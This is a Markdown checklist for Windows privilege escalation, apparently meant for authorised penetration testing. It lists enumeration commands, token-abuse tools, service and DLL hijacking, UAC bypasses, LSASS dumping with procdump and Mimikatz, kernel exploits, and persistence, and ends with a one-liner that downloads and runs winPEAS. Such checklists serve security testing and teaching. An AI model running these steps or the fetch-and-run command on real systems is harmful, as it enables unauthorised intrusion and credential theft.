##  Windows Priv-Esc Checklist
### 0. Preparation

- [ ] Confirm current context: `whoami /priv`, `whoami /groups`    
- [ ] Start logging: `Start-Transcript -Path C:\temp\privesc_log.txt`
- [ ] Drop enumeration tools if allowed (e.g., **winPEAS**, **Seatbelt**, **SharpUp**)
### 1. System Enumeration

- [ ]  OS & build: `systeminfo`, `ver`    
- [ ] Installed hotfixes: `wmic qfe get HotFixID,InstalledOn` / `Get-HotFix` ([onlinehashcrack.com](https://www.onlinehashcrack.com/guides/ethical-hacking/windows-enumeration-cheat-sheet-2025.php?utm_source=chatgpt.com "Windows Enumeration Cheat Sheet 2025 - [ ]Online Hash Crack"))
- [ ] Installed software: `wmic product get name,version`
- [ ] Running procs & services: `tasklist /svc`, `sc query state= all`
- [ ] Scheduled tasks: `schtasks /query /fo LIST /v`
- [ ] Network & shares: `ipconfig /all`, `net share`, `net view`, `netstat -ano`
- [ ] Domain context: `echo %USERDOMAIN%`, `nltest /dclist:%USERDOMAIN%`
- [ ] PATH & env vars for writable dirs: `set`    
### 2. Token / Impersonation Vectors

- [ ] **SeImpersonate / SeAssignPrimaryToken** → try **PrintSpoofer / JuicyPotatoNG** ([github.com](https://github.com/mthcht/ThreatHunting-Keywords/blob/main/GUIDproject_tag_detection.csv?utm_source=chatgpt.com "ThreatHunting-Keywords/GUIDproject_tag_detection.csv at main"))    
- [ ] **SeBackup / SeRestore** → copy SAM+SYSTEM hives, crack offline
- [ ] **SeDebug** → inspect privileged procs
- [ ] **SeLoadDriver** → load vulnerable driver → kernel exploit
### 3. Services & Binaries

- [ ] Hunt **unquoted paths**: `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /v "C:\Windows\\"`   
- [ ] Weak service ACLs: `accesschk.exe -uwcqv "Authenticated Users" *`
- [ ] Writable `ImagePath` or parameters: `reg query HKLM\SYSTEM\CurrentControlSet\Services\ /s`
- [ ] If write-able → replace binary / change `binPath` → restart service
### 4. Registry-Based Escalation

- [ ] **AlwaysInstallElevated** flags in HKCU & HKLM    
- [ ] Weak `Run/RunOnce` keys (check ACLs with `icacls`)
- [ ] Permissive autorun binaries → overwrite with payload
### 5. File / DLL Hijacking

- [ ] Writable dirs in `%PATH%` → plant fake exe/dll    
- [ ] Search for application DLL search-order issues → place malicious DLL
### 6. Scheduled Tasks

- [ ] Review tasks XML in `C:\Windows\System32\Tasks\`    
- [ ]  Writable task → modify to launch payload as SYSTEM
### 7. UAC Bypass (if in Administrators but medium integrity)

- [ ] Test `fodhelper.exe`, `eventvwr.msc`, `sdclt.exe` hijacks    
- [ ] Use `uacme` or Mimikatz `privilege::bypassuac` where possible
### 8. Credential Harvesting

- [ ] Dump LSASS (`procdump -ma lsass.exe lsass.dmp`) → run Mimikatz    
- [ ] List cached creds: `cmdkey /list`, `vaultcmd /listcreds`
- [ ] Seatbelt quick sweep: `Seatbelt.exe -group=credentials` ([delinea.com](https://delinea.com/blog/windows-privilege-escalation?utm_source=chatgpt.com "Privilege Escalation on Windows (With Examples) - [ ]Delinea"))
### 9. Kernel / Driver Exploits

- [ ] Match build to CVEs (e.g., **CVE-2024-21410**, **CVE-2023-36802**) ([hedgehogsecurity.co.uk](https://www.hedgehogsecurity.co.uk/blog/cve-2024-21410?utm_source=chatgpt.com "CVE-2024-21410, what is it and does it really matter to me?"), [steflan-security.com](https://steflan-security.com/windows-privilege-escalation-cheat-sheet/?utm_source=chatgpt.com "Windows Privilege Escalation Checklist - [ ]Steflan's Security Blog"))    
- [ ] Transfer & run exploit → verify `whoami` = `NT AUTHORITY\SYSTEM`
### 10. Containers / Virtual Artifacts

- [ ] Look for VMDK/VHDX mounts or Docker Desktop → abuse host mounts  
### 11. Post-Escalation

- [ ] Confirm SYSTEM shell    
- [ ] Dump hashes / create shadow copy
- [ ] Establish persistence (as permitted)
- [ ] Clean artifacts and finish transcript
### One-Liner Recon (optional)

```powershell
iwr -useb https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASany.exe -OutFile winpeas.exe; .\winpeas.exe quiet
```

WinPEAS highlights most of the above vectors in one shot ([medium.com](https://medium.com/%40sodahack/windows-privilege-escalation-guide-11ee6707794b?utm_source=chatgpt.com "Windows Privilege Escalation Guide | by Sodatex - [ ]Medium"))
